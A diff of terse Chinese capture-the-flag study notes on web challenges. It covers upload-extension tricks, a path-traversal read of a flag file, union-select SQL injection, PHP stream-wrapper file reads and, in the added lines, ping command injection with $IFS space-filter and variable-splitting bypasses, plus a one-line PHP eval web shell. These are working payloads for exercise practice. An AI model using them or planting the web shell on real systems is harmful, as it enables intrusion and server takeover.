@@ -75,7 +75,7 @@ bp抓包后修改jpg后缀改为php
 一张图片打开f12发现<!--source.php-->，访问source.php,发现需要访问hint.php
 访问后出现提示flag not here, and flag in ffffllllaaaagggg
 构造payload满足代码条件即file=hint.php
-访问上一个文件目录，直到找到ffffllllaaaagggg（五个if回退6次）
+访问上一个文件目录，直到找到ffffllllaaaagggg
 执行查看文件ffffllllaaaagggg的命令找到flag
 3.sql注入
 猜字段1' union select 1,2,3# 
@@ -255,3 +255,12 @@ data://text/plain；base64，base64编码的代码#编码后传入绕过字符�
 /?file=php://filter/convert.base64-encode/resource=flag.php查看flag
 warmup:目录层数：根目录.www.var.html(包含resource和hint),flag一般在根目录下面，返回四层目录../
 /source.php?file=source.php?/../../../../ffffllllaaaagggg
+exec：一道ping题
+上来就127001
+测试响应127001&&ls
+最后寻找flag：127001;tac/flag
+同样的ping，空格被过滤，尝试IFS绕过代替空格：$IFS$@
+又被过滤了，发现没有过滤=号
+构造等号绕过：127001;a=g;cat$IFS$@fla$a.php
+在F12查看器中搜索flag找到
+一句话木马：<?php@eval($_POST['attack']);?>
